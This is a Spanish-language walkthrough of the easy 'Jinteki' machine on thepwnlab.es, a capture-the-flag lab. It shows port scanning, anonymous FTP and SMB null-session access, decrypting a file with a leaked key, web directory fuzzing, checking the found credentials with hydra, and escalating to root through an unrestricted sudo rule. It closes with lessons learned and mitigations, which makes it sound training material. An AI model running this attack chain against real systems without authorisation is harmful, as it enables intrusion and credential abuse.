## Información General

|Campo|Detalle|
|---|---|
|Plataforma|thepwnlab.es|
|Máquina|Jinteki|
|IP|10.0.0.24|
|Dificultad|Fácil|
|Sistema Operativo|Linux (Ubuntu)|
|Hostname|jinteki-vm-ok-zgkvwu|
|Servicios expuestos|FTP (21), SSH (22), HTTP (80), NetBIOS/SMB (139/445)|
|Usuario final|noise → root|

## Resumen del Ataque

El reconocimiento inicial reveló un servidor FTP con acceso anónimo habilitado, un recurso SMB público sin autenticación y un portal web corporativo de "Jinteki Corporation". La cadena de explotación combinó tres piezas de información dispersas en distintos servicios: una clave de cifrado MD5 filtrada en un memo interno del FTP, un archivo cifrado en el share SMB público, y una contraseña temporal expuesta en un directorio de backups del servidor web descubierto por fuzzing. Combinando estos tres hallazgos se obtuvieron credenciales válidas para el usuario `noise`, válidas simultáneamente en FTP, SMB y SSH. Una vez dentro, `sudo -l` mostró permisos `(ALL : ALL) ALL` sin restricciones, lo que permitió escalar a root de forma directa.

## Técnicas Usadas

- Enumeración de puertos con Nmap (descubrimiento completo + detección de versión/scripts)
- Acceso FTP anónimo y descarga de ficheros expuestos
- Enumeración SMB con `smbmap` y `smbclient` (null session / recurso público)
- Descifrado de un archivo protegido con OpenSSL (AES-256-CBC, derivación de clave MD5)
- Fuzzing de directorios web con `dirsearch`
- Validación de credenciales con Hydra sobre múltiples servicios (FTP, SMB, SSH)
- Escalada de privilegios por configuración insegura de `sudo` (`ALL : ALL`)

## Desarrollo

### 1. Escaneo de puertos

Escaneo inicial de todos los puertos TCP:

```bash
nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 10.0.0.24
```

```
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

Escaneo de versiones y scripts por defecto sobre los puertos encontrados:

```bash
nmap -p 21,22,80,139,445 -sC -sV -oN allports 10.0.0.24
```

Resultado relevante: FTP con **acceso anónimo permitido** (vsftpd 3.0.2), Samba 4.3.11 en el puerto 445, y Apache 2.4.7 sirviendo un portal corporativo en el puerto 80.

### 2. Enumeración FTP anónimo

```bash
ftp 10.0.0.24
Name (10.0.0.24:kali): anonymous
Password:
230 Login successful.
```

Listado de ficheros disponibles:

```
ftp> ls
-rw-r--r--    1 106      115           424 Jul 17  2025 corp_memo.txt
-rw-r--r--    1 106      115            32 Jul 17  2025 install.log
-rw-r--r--    1 106      115            42 Jul 17  2025 policy.txt
-rw-r--r--    1 106      115            39 Jul 17  2025 welcome.txt
```

Se descargan los cuatro ficheros (`get`). De los cuatro, `install.log`, `policy.txt` y `welcome.txt` no aportan nada relevante:

```
cat install.log  → [LOG] Actualizacion completada.
cat policy.txt   → [POLICY] Cambiar contrasena cada 90 dias.
cat welcome.txt  → Bienvenido al servidor FTP de Jinteki.
```

`corp_memo.txt` sí es clave: contiene una clave de cifrado en formato hash-like que se guarda para uso posterior:

```
Clave de Cifrado: 5d41402abc4b2a76b9719d911017c592
```

### 3. Enumeración SMB

Enumeración de shares con `smbmap`:

```bash
smbmap -H 10.0.0.24
```

```
[+] IP: 10.0.0.24:445   Name: 10.0.0.24        Status: NULL Session
	Disk                       Permissions   Comment
	----                       -----------   -------
	print$                     NO ACCESS     Printer Drivers
	public                     READ ONLY     Public Share
	IPC$                       NO ACCESS     IPC Service
```

Conexión al share público en null session:

```bash
smbclient //10.0.0.24/public -N
```

```
smb: \> ls
  encrypted_agenda.txt    N      416
  README.txt              N      247
```

Descarga de ambos ficheros. El `README.txt` resulta ser la pista de descifrado:

```
-- Jinteki Corporation: Protocolo de Cifrado Estandar --
Para asegurar la compatibilidad con nuestros sistemas heredados, se debe usar
el algoritmo de derivacion de clave MD5.
Ejemplo: openssl enc -aes-256-cbc -d -md md5 -in [archivo] -k [clave]
```

### 4. Descifrado del archivo SMB con la clave del FTP

Uniendo la clave obtenida en `corp_memo.txt` (FTP) con el procedimiento indicado en `README.txt` (SMB):

```bash
openssl enc -aes-256-cbc -d -md md5 -in encrypted_agenda.txt -k 5d41402abc4b2a76b9719d911017c592
```

```
¡Acceso concedido! El siguiente nivel de seguridad protege las credenciales de los empleados.

ALERTA DE SEGURIDAD: Se ha detectado una anomalia en los logs de acceso a la
intranet corporativa relacionada con el usuario 'noise'. Parece que hay
credenciales temporales comprometidas.
```

Esto confirma el usuario objetivo (`noise`) pero todavía no aporta la contraseña — señala que hay que seguir buscando en el servicio web.

### 5. Enumeración web

Revisión manual del portal en `http://10.0.0.24/` — página estática de "Jinteki Corporation" con pestañas (Inicio, Departamentos, Proyectos, Acceso Empleados) y un formulario de login que es una trampa (siempre responde "ACCESO DENEGADO. INTENTO REGISTRADO." vía JavaScript, sin backend real).

Fuzzing de directorios y ficheros:

```bash
dirsearch -u http://10.0.0.24/ --exclude-status 403,404,500 -e php,txt,html
```

Hallazgo relevante:

```
http://10.0.0.24/backups/noise_pass.txt
```

Contenido del fichero:

```
La contrasena temporal para el usuario noise es: R3plicant!
```

### 6. Validación de credenciales

Con usuario (`noise`, confirmado por el mensaje OpenSSL) y contraseña (`R3plicant!`, del backup web) se valida el acceso contra los tres servicios expuestos que aceptan autenticación:

```bash
hydra -l noise -p R3plicant! ftp://10.0.0.24 -t 4
hydra -l noise -p R3plicant! smb://10.0.0.24 -t 4
hydra -l noise -p R3plicant! ssh://10.0.0.24 -t 4
```

Las tres validaciones confirman la credencial:

```
[21][ftp] host: 10.0.0.24   login: noise   password: R3plicant!
[445][smb] host: 10.0.0.24  login: noise   password: R3plicant!
[22][ssh] host: 10.0.0.24   login: noise   password: R3plicant!
```

### 7. Obtención de la flag de usuario (vía FTP)

```bash
ftp 10.0.0.24
Name: noise
Password: R3plicant!
```

```
ftp> ls
-rw-r--r--    1 1000     1000           33 Jul 17  2025 user.txt
ftp> get user.txt
```

```
cat user.txt
603a8e93d5454a83e39918a43a1062e4
```

### 8. Acceso SSH y escalada de privilegios

```bash
ssh noise@10.0.0.24
```

Enumeración rápida de usuarios del sistema:

```bash
noise@jinteki-vm-ok-zgkvwu:~$ grep bash /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
noise:x:1000:1000:Noise Runner,,,:/home/noise:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
nacho:x:1002:1003::/home/nacho:/bin/bash
hola_thepwnlab_es:x:1003:1004::/home/hola_thepwnlab_es:/bin/bash
```

Comprobación de privilegios sudo:

```bash
noise@jinteki-vm-ok-zgkvwu:~$ sudo -l
```

```
User noise may run the following commands on jinteki-vm-ok-zgkvwu:
    (ALL : ALL) ALL
```

Sin restricciones — escalada directa:

```bash
noise@jinteki-vm-ok-zgkvwu:~$ sudo su
root@jinteki-vm-ok-zgkvwu:/home/noise#
```

### 9. Obtención de la flag de root

```bash
root@jinteki-vm-ok-zgkvwu:~# cat root.txt
```

```
Felicidades, Runner. Has comprometido el nucleo del sistema. Run exitoso.

root.txt: b3c7d6a0a2d9b5a4b1e8f3dcb1a3b9d8
```

## Lecciones Aprendidas

- Una máquina puede repartir deliberadamente las piezas de una misma cadena de ataque entre servicios distintos (FTP, SMB, HTTP); la enumeración exhaustiva de **todos** los servicios expuestos, incluso los que parecen "vacíos" a primera vista, es imprescindible.
- El acceso anónimo/nulo en FTP y SMB sigue siendo una vía de entrada real y frecuente, no solo un caso de laboratorio.
- El fuzzing de directorios web no debe descartarse aunque el sitio parezca una landing estática sin funcionalidad aparente — los directorios de backups mal protegidos son un vector común.
- Validar credenciales encontradas contra todos los servicios de autenticación disponibles (no asumir que solo sirven para el servicio donde se hallaron) ahorra tiempo y confirma alcance.
- Una configuración de `sudo` con `(ALL : ALL) ALL` sin restricción de comandos anula por completo el propósito de sudo como control de privilegios.

## Medidas de Mitigación

- Deshabilitar el acceso anónimo en FTP (`anonymous_enable=NO` en `vsftpd.conf`) salvo necesidad estrictamente justificada.
- Eliminar o restringir con autenticación los shares SMB públicos; auditar periódicamente los permisos de `smb.conf`.
- No almacenar claves de cifrado, contraseñas o credenciales en texto plano en recursos accesibles sin autenticación (memos, logs, backups).
- Excluir del document root web cualquier directorio de backups (`/backups/`, `/.old/`, etc.) o protegerlo con autenticación y reglas de acceso explícitas.
- Aplicar el principio de mínimo privilegio en `sudoers`: nunca usar `(ALL : ALL) ALL` para usuarios operativos; delimitar comandos concretos.
- Forzar rotación de credenciales temporales y evitar reutilizar la misma contraseña entre múltiples servicios (FTP, SMB, SSH).


